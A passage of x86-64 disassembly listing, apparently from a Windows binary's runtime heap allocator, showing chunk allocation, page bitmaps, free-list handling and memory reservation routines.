    69685462:	48 c1 fa 0c          	sar    $0xc,%rdx
    69685466:	48 8d 89 a8 20 00 00 	lea    0x20a8(%rcx),%rcx
    6968546d:	e8 a7 ff ff ff       	call   0x69685419
    69685472:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69685478:	49 8b 81 80 20 00 00 	mov    0x2080(%r9),%rax
    6968547f:	4c 89 d1             	mov    %r10,%rcx
    69685482:	49 39 81 88 20 00 00 	cmp    %rax,0x2088(%r9)
    69685489:	48 89 c2             	mov    %rax,%rdx
    6968548c:	49 0f 4d 91 88 20 00 	cmovge 0x2088(%r9),%rdx
    69685493:	00 
    69685494:	4c 29 d8             	sub    %r11,%rax
    69685497:	49 89 81 80 20 00 00 	mov    %rax,0x2080(%r9)
    6968549e:	49 89 91 88 20 00 00 	mov    %rdx,0x2088(%r9)
    696854a5:	31 d2                	xor    %edx,%edx
    696854a7:	ff 15 f7 8d 10 00    	call   *0x108df7(%rip)        # 0x6978e2a4
    696854ad:	85 c0                	test   %eax,%eax
    696854af:	75 17                	jne    0x696854c8
    696854b1:	48 8d 0d 8d 8f 00 00 	lea    0x8f8d(%rip),%rcx        # 0x6968e445
    696854b8:	e8 63 71 00 00       	call   0x6968c620
    696854bd:	b9 01 00 00 00       	mov    $0x1,%ecx
    696854c2:	e8 79 71 00 00       	call   0x6968c640
    696854c7:	90                   	nop
    696854c8:	48 83 c4 28          	add    $0x28,%rsp
    696854cc:	c3                   	ret
    696854cd:	48 83 ec 28          	sub    $0x28,%rsp
    696854d1:	49 89 d0             	mov    %rdx,%r8
    696854d4:	48 c1 fa 09          	sar    $0x9,%rdx
    696854d8:	e8 24 ff ff ff       	call   0x69685401
    696854dd:	31 d2                	xor    %edx,%edx
    696854df:	48 85 c0             	test   %rax,%rax
    696854e2:	74 1b                	je     0x696854ff
    696854e4:	4c 89 c1             	mov    %r8,%rcx
    696854e7:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
    696854ed:	48 89 ca             	mov    %rcx,%rdx
    696854f0:	48 c1 fa 06          	sar    $0x6,%rdx
    696854f4:	48 8b 54 d0 10       	mov    0x10(%rax,%rdx,8),%rdx
    696854f9:	48 d3 ea             	shr    %cl,%rdx
    696854fc:	83 e2 01             	and    $0x1,%edx
    696854ff:	89 d0                	mov    %edx,%eax
    69685501:	48 83 c4 28          	add    $0x28,%rsp
    69685505:	c3                   	ret
    69685506:	48 83 ec 28          	sub    $0x28,%rsp
    6968550a:	49 89 ca             	mov    %rcx,%r10
    6968550d:	49 89 d1             	mov    %rdx,%r9
    69685510:	48 c1 fa 0c          	sar    $0xc,%rdx
    69685514:	48 8d 89 a8 20 00 00 	lea    0x20a8(%rcx),%rcx
    6968551b:	e8 ad ff ff ff       	call   0x696854cd
    69685520:	84 c0                	test   %al,%al
    69685522:	75 0c                	jne    0x69685530
    69685524:	31 c9                	xor    %ecx,%ecx
    69685526:	4d 3b 0a             	cmp    (%r10),%r9
    69685529:	73 5e                	jae    0x69685589
    6968552b:	e9 84 00 00 00       	jmp    0x696855b4
    69685530:	4c 89 ca             	mov    %r9,%rdx
    69685533:	31 c9                	xor    %ecx,%ecx
    69685535:	48 81 e2 00 f0 ff ff 	and    $0xfffffffffffff000,%rdx
    6968553c:	f6 02 01             	testb  $0x1,(%rdx)
    6968553f:	74 73                	je     0x696855b4
    69685541:	4c 8b 42 08          	mov    0x8(%rdx),%r8
    69685545:	49 81 f8 c0 0f 00 00 	cmp    $0xfc0,%r8
    6968554c:	7e 19                	jle    0x69685567
    6968554e:	48 8d 4a 20          	lea    0x20(%rdx),%rcx
    69685552:	49 39 c9             	cmp    %rcx,%r9
    69685555:	72 5b                	jb     0x696855b2
    69685557:	48 83 7a 28 01       	cmpq   $0x1,0x28(%rdx)
    6968555c:	b8 00 00 00 00       	mov    $0x0,%eax
    69685561:	48 0f 46 c8          	cmovbe %rax,%rcx
    69685565:	eb 4d                	jmp    0x696855b4
    69685567:	41 81 e1 ff 0f 00 00 	and    $0xfff,%r9d
    6968556e:	31 c9                	xor    %ecx,%ecx
    69685570:	49 8d 41 c0          	lea    -0x40(%r9),%rax
    69685574:	48 3b 42 30          	cmp    0x30(%rdx),%rax
    69685578:	73 3a                	jae    0x696855b4
    6968557a:	48 8d 4c 02 40       	lea    0x40(%rdx,%rax,1),%rcx
    6968557f:	31 d2                	xor    %edx,%edx
    69685581:	49 f7 f0             	div    %r8
    69685584:	48 29 d1             	sub    %rdx,%rcx
    69685587:	eb 22                	jmp    0x696855ab
    69685589:	31 c9                	xor    %ecx,%ecx
    6968558b:	4d 3b 4a 08          	cmp    0x8(%r10),%r9
    6968558f:	77 23                	ja     0x696855b4
    69685591:	49 8b 8a a8 28 00 00 	mov    0x28a8(%r10),%rcx
    69685598:	4c 89 ca             	mov    %r9,%rdx
    6968559b:	e8 fd f8 ff ff       	call   0x69684e9d
    696855a0:	31 c9                	xor    %ecx,%ecx
    696855a2:	48 85 c0             	test   %rax,%rax
    696855a5:	74 0d                	je     0x696855b4
    696855a7:	48 8b 48 10          	mov    0x10(%rax),%rcx
    696855ab:	48 83 79 08 01       	cmpq   $0x1,0x8(%rcx)
    696855b0:	77 02                	ja     0x696855b4
    696855b2:	31 c9                	xor    %ecx,%ecx
    696855b4:	48 89 c8             	mov    %rcx,%rax
    696855b7:	48 83 c4 28          	add    $0x28,%rsp
    696855bb:	c3                   	ret
    696855bc:	48 83 ec 28          	sub    $0x28,%rsp
    696855c0:	48 8b 05 21 f2 0f 00 	mov    0xff221(%rip),%rax        # 0x697847e8
    696855c7:	48 85 c0             	test   %rax,%rax
    696855ca:	74 02                	je     0x696855ce
    696855cc:	ff d0                	call   *%rax
    696855ce:	b9 02 00 00 00       	mov    $0x2,%ecx
    696855d3:	ff 15 17 7b 00 00    	call   *0x7b17(%rip)        # 0x6968d0f0
    696855d9:	48 8d 15 7a 8e 00 00 	lea    0x8e7a(%rip),%rdx        # 0x6968e45a
    696855e0:	48 89 c1             	mov    %rax,%rcx
    696855e3:	e8 3e c4 ff ff       	call   0x69681a26
    696855e8:	b9 01 00 00 00       	mov    $0x1,%ecx
    696855ed:	e8 4e 70 00 00       	call   0x6968c640
    696855f2:	90                   	nop
    696855f3:	48 83 ec 28          	sub    $0x28,%rsp
    696855f7:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    696855fd:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    69685603:	48 89 ca             	mov    %rcx,%rdx
    69685606:	31 c9                	xor    %ecx,%ecx
    69685608:	ff 15 8e 8c 10 00    	call   *0x108c8e(%rip)        # 0x6978e29c
    6968560e:	48 85 c0             	test   %rax,%rax
    69685611:	75 05                	jne    0x69685618
    69685613:	e8 a4 ff ff ff       	call   0x696855bc
    69685618:	48 83 c4 28          	add    $0x28,%rsp
    6968561c:	c3                   	ret
    6968561d:	56                   	push   %rsi
    6968561e:	53                   	push   %rbx
    6968561f:	48 83 ec 28          	sub    $0x28,%rsp
    69685623:	48 8b b1 78 20 00 00 	mov    0x2078(%rcx),%rsi
    6968562a:	48 85 f6             	test   %rsi,%rsi
    6968562d:	48 89 cb             	mov    %rcx,%rbx
    69685630:	74 05                	je     0x69685637
    69685632:	48 39 16             	cmp    %rdx,(%rsi)
    69685635:	7d 39                	jge    0x69685670
    69685637:	b9 00 10 00 00       	mov    $0x1000,%ecx
    6968563c:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
    69685641:	e8 ad ff ff ff       	call   0x696855f3
    69685646:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
    6968564b:	48 89 83 78 20 00 00 	mov    %rax,0x2078(%rbx)
    69685652:	48 81 83 80 20 00 00 	addq   $0x1000,0x2080(%rbx)
    69685659:	00 10 00 00 
    6968565d:	48 89 70 10          	mov    %rsi,0x10(%rax)
    69685661:	48 c7 00 e8 0f 00 00 	movq   $0xfe8,(%rax)
    69685668:	48 c7 40 08 18 00 00 	movq   $0x18,0x8(%rax)
    6968566f:	00 
    69685670:	48 8b 8b 78 20 00 00 	mov    0x2078(%rbx),%rcx
    69685677:	4c 8b 41 08          	mov    0x8(%rcx),%r8
    6968567b:	48 29 11             	sub    %rdx,(%rcx)
    6968567e:	4e 8d 0c 01          	lea    (%rcx,%r8,1),%r9
    69685682:	49 01 d0             	add    %rdx,%r8
    69685685:	4c 89 41 08          	mov    %r8,0x8(%rcx)
    69685689:	4c 89 c9             	mov    %r9,%rcx
    6968568c:	e8 3b c3 ff ff       	call   0x696819cc
    69685691:	4c 89 c8             	mov    %r9,%rax
    69685694:	48 83 c4 28          	add    $0x28,%rsp
    69685698:	5b                   	pop    %rbx
    69685699:	5e                   	pop    %rsi
    6968569a:	c3                   	ret
    6968569b:	56                   	push   %rsi
    6968569c:	53                   	push   %rbx
    6968569d:	48 83 ec 28          	sub    $0x28,%rsp
    696856a1:	48 89 d6             	mov    %rdx,%rsi
    696856a4:	48 8b 91 c0 28 00 00 	mov    0x28c0(%rcx),%rdx
    696856ab:	48 89 cb             	mov    %rcx,%rbx
    696856ae:	48 85 d2             	test   %rdx,%rdx
    696856b1:	75 19                	jne    0x696856cc
    696856b3:	ba 28 00 00 00       	mov    $0x28,%edx
    696856b8:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
    696856bd:	e8 5b ff ff ff       	call   0x6968561d
    696856c2:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
    696856c7:	48 89 c2             	mov    %rax,%rdx
    696856ca:	eb 0a                	jmp    0x696856d6
    696856cc:	48 8b 02             	mov    (%rdx),%rax
    696856cf:	48 89 81 c0 28 00 00 	mov    %rax,0x28c0(%rcx)
    696856d6:	48 89 72 10          	mov    %rsi,0x10(%rdx)
    696856da:	48 89 d9             	mov    %rbx,%rcx
    696856dd:	4c 89 42 18          	mov    %r8,0x18(%rdx)
    696856e1:	e8 f3 fa ff ff       	call   0x696851d9
    696856e6:	48 89 02             	mov    %rax,(%rdx)
    696856e9:	48 89 42 08          	mov    %rax,0x8(%rdx)
    696856ed:	48 89 d0             	mov    %rdx,%rax
    696856f0:	48 c7 42 20 01 00 00 	movq   $0x1,0x20(%rdx)
    696856f7:	00 
    696856f8:	48 83 c4 28          	add    $0x28,%rsp
    696856fc:	5b                   	pop    %rbx
    696856fd:	5e                   	pop    %rsi
    696856fe:	c3                   	ret
    696856ff:	53                   	push   %rbx
    69685700:	48 83 ec 20          	sub    $0x20,%rsp
    69685704:	48 89 d3             	mov    %rdx,%rbx
    69685707:	4c 89 c2             	mov    %r8,%rdx
    6968570a:	48 8b 03             	mov    (%rbx),%rax
    6968570d:	48 3b 00             	cmp    (%rax),%rax
    69685710:	74 08                	je     0x6968571a
    69685712:	4c 39 40 10          	cmp    %r8,0x10(%rax)
    69685716:	76 13                	jbe    0x6968572b
    69685718:	eb 17                	jmp    0x69685731
    6968571a:	4d 89 c8             	mov    %r9,%r8
    6968571d:	e8 79 ff ff ff       	call   0x6968569b
    69685722:	48 89 03             	mov    %rax,(%rbx)
    69685725:	48 83 c4 20          	add    $0x20,%rsp
    69685729:	5b                   	pop    %rbx
    6968572a:	c3                   	ret
    6968572b:	74 0f                	je     0x6968573c
    6968572d:	48 83 c0 08          	add    $0x8,%rax
    69685731:	49 89 d0             	mov    %rdx,%r8
    69685734:	48 89 c2             	mov    %rax,%rdx
    69685737:	e8 c3 ff ff ff       	call   0x696856ff
    6968573c:	48 89 d9             	mov    %rbx,%rcx
    6968573f:	e8 73 fa ff ff       	call   0x696851b7
    69685744:	90                   	nop
    69685745:	48 83 c4 20          	add    $0x20,%rsp
    69685749:	5b                   	pop    %rbx
    6968574a:	e9 3b fa ff ff       	jmp    0x6968518a
    6968574f:	56                   	push   %rsi
    69685750:	53                   	push   %rbx
    69685751:	48 83 ec 28          	sub    $0x28,%rsp
    69685755:	48 89 d6             	mov    %rdx,%rsi
    69685758:	49 89 c9             	mov    %rcx,%r9
    6968575b:	4c 89 c2             	mov    %r8,%rdx
    6968575e:	48 89 f1             	mov    %rsi,%rcx
    69685761:	4c 89 c3             	mov    %r8,%rbx
    69685764:	e8 98 fc ff ff       	call   0x69685401
    69685769:	48 85 c0             	test   %rax,%rax
    6968576c:	75 21                	jne    0x6968578f
    6968576e:	ba 50 00 00 00       	mov    $0x50,%edx
    69685773:	4c 89 c9             	mov    %r9,%rcx
    69685776:	e8 a2 fe ff ff       	call   0x6968561d
    6968577b:	0f b6 d3             	movzbl %bl,%edx
    6968577e:	48 8d 14 d6          	lea    (%rsi,%rdx,8),%rdx
    69685782:	48 8b 0a             	mov    (%rdx),%rcx
    69685785:	48 89 08             	mov    %rcx,(%rax)
    69685788:	48 89 02             	mov    %rax,(%rdx)
    6968578b:	48 89 58 08          	mov    %rbx,0x8(%rax)
    6968578f:	48 83 c4 28          	add    $0x28,%rsp
    69685793:	5b                   	pop    %rbx
    69685794:	5e                   	pop    %rsi
    69685795:	c3                   	ret
    69685796:	53                   	push   %rbx
    69685797:	48 83 ec 20          	sub    $0x20,%rsp
    6968579b:	4c 89 c3             	mov    %r8,%rbx
    6968579e:	49 c1 f8 09          	sar    $0x9,%r8
    696857a2:	e8 a8 ff ff ff       	call   0x6968574f
    696857a7:	81 e3 ff 01 00 00    	and    $0x1ff,%ebx
    696857ad:	ba 01 00 00 00       	mov    $0x1,%edx
    696857b2:	49 89 d8             	mov    %rbx,%r8
    696857b5:	48 89 d9             	mov    %rbx,%rcx
    696857b8:	49 c1 f8 06          	sar    $0x6,%r8
    696857bc:	48 d3 e2             	shl    %cl,%rdx
    696857bf:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
    696857c4:	48 83 c4 20          	add    $0x20,%rsp
    696857c8:	5b                   	pop    %rbx
    696857c9:	c3                   	ret
    696857ca:	56                   	push   %rsi
    696857cb:	53                   	push   %rbx
    696857cc:	48 83 ec 38          	sub    $0x38,%rsp
    696857d0:	48 89 cb             	mov    %rcx,%rbx
    696857d3:	48 89 d1             	mov    %rdx,%rcx
    696857d6:	48 89 d6             	mov    %rdx,%rsi
    696857d9:	e8 15 fe ff ff       	call   0x696855f3
    696857de:	48 8d 93 a8 20 00 00 	lea    0x20a8(%rbx),%rdx
    696857e5:	48 89 d9             	mov    %rbx,%rcx
    696857e8:	48 01 b3 80 20 00 00 	add    %rsi,0x2080(%rbx)
    696857ef:	49 89 c0             	mov    %rax,%r8
    696857f2:	48 89 70 08          	mov    %rsi,0x8(%rax)
    696857f6:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    696857fd:	00 
    696857fe:	49 c1 f8 0c          	sar    $0xc,%r8
    69685802:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    69685809:	00 
    6968580a:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
    69685811:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69685816:	e8 7b ff ff ff       	call   0x69685796
    6968581b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    69685820:	48 83 c4 38          	add    $0x38,%rsp
    69685824:	5b                   	pop    %rbx
    69685825:	5e                   	pop    %rsi
    69685826:	c3                   	ret
    69685827:	57                   	push   %rdi
    69685828:	56                   	push   %rsi
    69685829:	53                   	push   %rbx
    6968582a:	48 83 ec 20          	sub    $0x20,%rsp
    6968582e:	4c 8b 52 08          	mov    0x8(%rdx),%r10
    69685832:	49 8d 1c 10          	lea    (%r8,%rdx,1),%rbx
    69685836:	4d 29 c2             	sub    %r8,%r10
    69685839:	49 89 d1             	mov    %rdx,%r9
    6968583c:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
    69685841:	4c 89 53 08          	mov    %r10,0x8(%rbx)
    69685845:	4c 8b 5a 08          	mov    0x8(%rdx),%r11
    69685849:	48 8d b9 a8 20 00 00 	lea    0x20a8(%rcx),%rdi
    69685850:	48 89 ce             	mov    %rcx,%rsi
    69685853:	4c 89 03             	mov    %r8,(%rbx)
    69685856:	48 89 f9             	mov    %rdi,%rcx
    69685859:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
    69685860:	00 
    69685861:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
    69685868:	00 
    69685869:	49 01 d3             	add    %rdx,%r11
    6968586c:	4c 89 da             	mov    %r11,%rdx
    6968586f:	48 c1 fa 0c          	sar    $0xc,%rdx
    69685873:	e8 55 fc ff ff       	call   0x696854cd
    69685878:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
    6968587d:	84 c0                	test   %al,%al
    6968587f:	74 0c                	je     0x6968588d
    69685881:	49 8b 03             	mov    (%r11),%rax
    69685884:	83 e0 01             	and    $0x1,%eax
    69685887:	4c 09 d0             	or     %r10,%rax
    6968588a:	49 89 03             	mov    %rax,(%r11)
    6968588d:	4d 89 41 08          	mov    %r8,0x8(%r9)
    69685891:	49 89 d8             	mov    %rbx,%r8
    69685894:	48 89 fa             	mov    %rdi,%rdx
    69685897:	48 89 f1             	mov    %rsi,%rcx
    6968589a:	49 c1 f8 0c          	sar    $0xc,%r8
    6968589e:	e8 f3 fe ff ff       	call   0x69685796
    696858a3:	48 89 d8             	mov    %rbx,%rax
    696858a6:	48 83 c4 20          	add    $0x20,%rsp
    696858aa:	5b                   	pop    %rbx
    696858ab:	5e                   	pop    %rsi
    696858ac:	5f                   	pop    %rdi
    696858ad:	c3                   	ret
    696858ae:	41 54                	push   %r12
    696858b0:	55                   	push   %rbp
    696858b1:	57                   	push   %rdi
    696858b2:	56                   	push   %rsi
    696858b3:	53                   	push   %rbx
    696858b4:	48 83 ec 20          	sub    $0x20,%rsp
    696858b8:	48 8b 42 08          	mov    0x8(%rdx),%rax
    696858bc:	48 01 81 90 20 00 00 	add    %rax,0x2090(%rcx)
    696858c3:	48 8b 02             	mov    (%rdx),%rax
    696858c6:	48 8d a9 a8 20 00 00 	lea    0x20a8(%rcx),%rbp
    696858cd:	48 89 ce             	mov    %rcx,%rsi
    696858d0:	48 89 d3             	mov    %rdx,%rbx
    696858d3:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
    696858d7:	48 89 02             	mov    %rax,(%rdx)
    696858da:	0f 84 80 00 00 00    	je     0x69685960
    696858e0:	48 89 d7             	mov    %rdx,%rdi
    696858e3:	48 89 e9             	mov    %rbp,%rcx
    696858e6:	48 29 c7             	sub    %rax,%rdi
    696858e9:	48 89 fa             	mov    %rdi,%rdx
    696858ec:	48 c1 fa 0c          	sar    $0xc,%rdx
    696858f0:	e8 d8 fb ff ff       	call   0x696854cd
    696858f5:	84 c0                	test   %al,%al
    696858f7:	74 67                	je     0x69685960
    696858f9:	f6 07 01             	testb  $0x1,(%rdi)
    696858fc:	75 62                	jne    0x69685960
    696858fe:	48 8b 47 08          	mov    0x8(%rdi),%rax
    69685902:	48 3d c0 0f 00 00    	cmp    $0xfc0,%rax
    69685908:	7e 56                	jle    0x69685960
    6968590a:	48 3d ff ff ff 3e    	cmp    $0x3effffff,%rax
    69685910:	7f 4e                	jg     0x69685960
    69685912:	48 89 fa             	mov    %rdi,%rdx
    69685915:	48 89 f1             	mov    %rsi,%rcx
    69685918:	e8 ba f7 ff ff       	call   0x696850d7
    6968591d:	48 8b 43 08          	mov    0x8(%rbx),%rax
    69685921:	48 c1 fb 0c          	sar    $0xc,%rbx
    69685925:	48 89 e9             	mov    %rbp,%rcx
    69685928:	48 01 47 08          	add    %rax,0x8(%rdi)
    6968592c:	48 89 da             	mov    %rbx,%rdx
    6968592f:	48 89 fb             	mov    %rdi,%rbx
    69685932:	e8 e2 fa ff ff       	call   0x69685419
    69685937:	48 81 7f 08 00 00 00 	cmpq   $0x3f000000,0x8(%rdi)
    6968593e:	3f 
    6968593f:	7e 1f                	jle    0x69685960
    69685941:	48 89 fa             	mov    %rdi,%rdx
    69685944:	48 89 f1             	mov    %rsi,%rcx
    69685947:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
    6968594d:	e8 d5 fe ff ff       	call   0x69685827
    69685952:	48 89 fa             	mov    %rdi,%rdx
    69685955:	48 89 f1             	mov    %rsi,%rcx
    69685958:	48 89 c3             	mov    %rax,%rbx
    6968595b:	e8 22 fa ff ff       	call   0x69685382
    69685960:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
    69685964:	48 89 e9             	mov    %rbp,%rcx
    69685967:	4a 8d 3c 0b          	lea    (%rbx,%r9,1),%rdi
    6968596b:	49 89 fc             	mov    %rdi,%r12
    6968596e:	49 c1 fc 0c          	sar    $0xc,%r12
    69685972:	4c 89 e2             	mov    %r12,%rdx
    69685975:	e8 53 fb ff ff       	call   0x696854cd
    6968597a:	84 c0                	test   %al,%al
    6968597c:	74 5c                	je     0x696859da
    6968597e:	f6 07 01             	testb  $0x1,(%rdi)
    69685981:	75 57                	jne    0x696859da
    69685983:	48 81 7f 08 c0 0f 00 	cmpq   $0xfc0,0x8(%rdi)
    6968598a:	00 
    6968598b:	7e 4d                	jle    0x696859da
    6968598d:	49 81 f9 ff ff ff 3e 	cmp    $0x3effffff,%r9
    69685994:	7f 44                	jg     0x696859da
    69685996:	48 89 fa             	mov    %rdi,%rdx
    69685999:	48 89 f1             	mov    %rsi,%rcx
    6968599c:	e8 36 f7 ff ff       	call   0x696850d7
    696859a1:	48 8b 47 08          	mov    0x8(%rdi),%rax
    696859a5:	4c 89 e2             	mov    %r12,%rdx
    696859a8:	48 89 e9             	mov    %rbp,%rcx
    696859ab:	48 01 43 08          	add    %rax,0x8(%rbx)
    696859af:	e8 65 fa ff ff       	call   0x69685419
    696859b4:	48 81 7b 08 00 00 00 	cmpq   $0x3f000000,0x8(%rbx)
    696859bb:	3f 
    696859bc:	7e 1c                	jle    0x696859da
    696859be:	48 89 da             	mov    %rbx,%rdx
    696859c1:	48 89 f1             	mov    %rsi,%rcx
    696859c4:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
    696859ca:	e8 58 fe ff ff       	call   0x69685827
    696859cf:	48 89 f1             	mov    %rsi,%rcx
    696859d2:	48 89 c2             	mov    %rax,%rdx
    696859d5:	e8 a8 f9 ff ff       	call   0x69685382
    696859da:	48 89 da             	mov    %rbx,%rdx
    696859dd:	48 89 f1             	mov    %rsi,%rcx
    696859e0:	48 83 c4 20          	add    $0x20,%rsp
    696859e4:	5b                   	pop    %rbx
    696859e5:	5e                   	pop    %rsi
    696859e6:	5f                   	pop    %rdi
    696859e7:	5d                   	pop    %rbp
    696859e8:	41 5c                	pop    %r12
    696859ea:	e9 93 f9 ff ff       	jmp    0x69685382
    696859ef:	48 83 ec 28          	sub    $0x28,%rsp
    696859f3:	49 89 d2             	mov    %rdx,%r10
    696859f6:	49 89 cb             	mov    %rcx,%r11
    696859f9:	48 8b 89 98 20 00 00 	mov    0x2098(%rcx),%rcx
    69685a00:	49 81 e2 00 f0 ff ff 	and    $0xfffffffffffff000,%r10
    69685a07:	49 8b 42 08          	mov    0x8(%r10),%rax
    69685a0b:	48 29 c1             	sub    %rax,%rcx
    69685a0e:	48 3d c0 0f 00 00    	cmp    $0xfc0,%rax
    69685a14:	49 89 8b 98 20 00 00 	mov    %rcx,0x2098(%r11)
    69685a1b:	7e 32                	jle    0x69685a4f
    69685a1d:	4c 89 d9             	mov    %r11,%rcx
    69685a20:	e8 b4 f7 ff ff       	call   0x696851d9
    69685a25:	49 89 83 b0 28 00 00 	mov    %rax,0x28b0(%r11)
    69685a2c:	49 8d 93 a8 28 00 00 	lea    0x28a8(%r11),%rdx
    69685a33:	4d 8d 42 20          	lea    0x20(%r10),%r8
    69685a37:	e8 bd f7 ff ff       	call   0x696851f9
    69685a3c:	49 81 7a 08 00 00 00 	cmpq   $0x3f000000,0x8(%r10)
    69685a43:	3f 
    69685a44:	0f 8e ba 00 00 00    	jle    0x69685b04
    69685a4a:	e9 c4 00 00 00       	jmp    0x69685b13
    69685a4f:	49 8b 4a 20          	mov    0x20(%r10),%rcx
    69685a53:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
    69685a5a:	00 
    69685a5b:	48 89 0a             	mov    %rcx,(%rdx)
    69685a5e:	49 89 52 20          	mov    %rdx,0x20(%r10)
    69685a62:	49 8b 52 28          	mov    0x28(%r10),%rdx
    69685a66:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
    69685a6a:	48 39 c2             	cmp    %rax,%rdx
    69685a6d:	7c 13                	jl     0x69685a82
    69685a6f:	48 81 f9 c0 0f 00 00 	cmp    $0xfc0,%rcx
    69685a76:	49 89 4a 28          	mov    %rcx,0x28(%r10)
    69685a7a:	0f 85 a2 00 00 00    	jne    0x69685b22
    69685a80:	eb 2a                	jmp    0x69685aac
    69685a82:	48 99                	cqto
    69685a84:	41 b8 10 00 00 00    	mov    $0x10,%r8d
    69685a8a:	49 f7 f8             	idiv   %r8
    69685a8d:	49 8d 14 c3          	lea    (%r11,%rax,8),%rdx
    69685a91:	48 8b 42 10          	mov    0x10(%rdx),%rax
    69685a95:	48 85 c0             	test   %rax,%rax
    69685a98:	49 89 42 10          	mov    %rax,0x10(%r10)
    69685a9c:	74 04                	je     0x69685aa2
    69685a9e:	4c 89 50 18          	mov    %r10,0x18(%rax)
    69685aa2:	4c 89 52 10          	mov    %r10,0x10(%rdx)
    69685aa6:	49 89 4a 28          	mov    %rcx,0x28(%r10)
    69685aaa:	eb 76                	jmp    0x69685b22
    69685aac:	48 99                	cqto
    69685aae:	b9 10 00 00 00       	mov    $0x10,%ecx
    69685ab3:	48 f7 f9             	idiv   %rcx
    69685ab6:	49 8d 14 c3          	lea    (%r11,%rax,8),%rdx
    69685aba:	49 8b 42 10          	mov    0x10(%r10),%rax
    69685abe:	4c 3b 52 10          	cmp    0x10(%rdx),%r10
    69685ac2:	74 17                	je     0x69685adb
    69685ac4:	49 8b 52 18          	mov    0x18(%r10),%rdx
    69685ac8:	48 89 42 10          	mov    %rax,0x10(%rdx)
    69685acc:	49 8b 42 10          	mov    0x10(%r10),%rax
    69685ad0:	48 85 c0             	test   %rax,%rax
    69685ad3:	74 17                	je     0x69685aec
    69685ad5:	48 89 50 18          	mov    %rdx,0x18(%rax)
    69685ad9:	eb 11                	jmp    0x69685aec
    69685adb:	48 85 c0             	test   %rax,%rax
    69685ade:	48 89 42 10          	mov    %rax,0x10(%rdx)
    69685ae2:	74 08                	je     0x69685aec
    69685ae4:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    69685aeb:	00 
    69685aec:	49 c7 42 10 00 00 00 	movq   $0x0,0x10(%r10)
    69685af3:	00 
    69685af4:	49 c7 42 18 00 00 00 	movq   $0x0,0x18(%r10)
    69685afb:	00 
    69685afc:	49 c7 42 08 00 10 00 	movq   $0x1000,0x8(%r10)
    69685b03:	00 
    69685b04:	4c 89 d2             	mov    %r10,%rdx
    69685b07:	4c 89 d9             	mov    %r11,%rcx
    69685b0a:	48 83 c4 28          	add    $0x28,%rsp
    69685b0e:	e9 9b fd ff ff       	jmp    0x696858ae
    69685b13:	4c 89 d2             	mov    %r10,%rdx
    69685b16:	4c 89 d9             	mov    %r11,%rcx
    69685b19:	48 83 c4 28          	add    $0x28,%rsp
    69685b1d:	e9 32 f9 ff ff       	jmp    0x69685454
    69685b22:	48 83 c4 28          	add    $0x28,%rsp
    69685b26:	c3                   	ret
    69685b27:	53                   	push   %rbx
    69685b28:	48 83 ec 30          	sub    $0x30,%rsp
    69685b2c:	48 89 cb             	mov    %rcx,%rbx
    69685b2f:	48 89 d1             	mov    %rdx,%rcx
    69685b32:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
    69685b37:	e8 37 f3 ff ff       	call   0x69684e73
    69685b3c:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
    69685b41:	48 8d 4b 68          	lea    0x68(%rbx),%rcx
    69685b45:	48 83 c4 30          	add    $0x30,%rsp
    69685b49:	5b                   	pop    %rbx
    69685b4a:	e9 a0 fe ff ff       	jmp    0x696859ef
    69685b4f:	41 57                	push   %r15
    69685b51:	41 56                	push   %r14
    69685b53:	41 55                	push   %r13
    69685b55:	41 54                	push   %r12
    69685b57:	55                   	push   %rbp
    69685b58:	57                   	push   %rdi
    69685b59:	56                   	push   %rsi
    69685b5a:	53                   	push   %rbx
    69685b5b:	48 83 ec 48          	sub    $0x48,%rsp
    69685b5f:	45 31 e4             	xor    %r12d,%r12d
    69685b62:	48 89 cb             	mov    %rcx,%rbx
    69685b65:	c6 81 30 29 00 00 01 	movb   $0x1,0x2930(%rcx)
    69685b6c:	4c 8d b1 90 2b 00 00 	lea    0x2b90(%rcx),%r14
    69685b73:	4a 8b b4 e3 10 21 00 	mov    0x2110(%rbx,%r12,8),%rsi
    69685b7a:	00 
    69685b7b:	48 85 f6             	test   %rsi,%rsi
    69685b7e:	75 24                	jne    0x69685ba4
    69685b80:	49 ff c4             	inc    %r12
    69685b83:	49 81 fc 00 01 00 00 	cmp    $0x100,%r12
    69685b8a:	75 e7                	jne    0x69685b73
    69685b8c:	c6 83 30 29 00 00 00 	movb   $0x0,0x2930(%rbx)
    69685b93:	48 83 c4 48          	add    $0x48,%rsp
    69685b97:	5b                   	pop    %rbx
    69685b98:	5e                   	pop    %rsi
    69685b99:	5f                   	pop    %rdi
    69685b9a:	5d                   	pop    %rbp
    69685b9b:	41 5c                	pop    %r12
    69685b9d:	41 5d                	pop    %r13
    69685b9f:	41 5e                	pop    %r14
    69685ba1:	41 5f                	pop    %r15
    69685ba3:	c3                   	ret
    69685ba4:	31 ff                	xor    %edi,%edi
    69685ba6:	48 89 f8             	mov    %rdi,%rax
    69685ba9:	48 8b 6c fe 10       	mov    0x10(%rsi,%rdi,8),%rbp
    69685bae:	48 c1 e0 06          	shl    $0x6,%rax
    69685bb2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
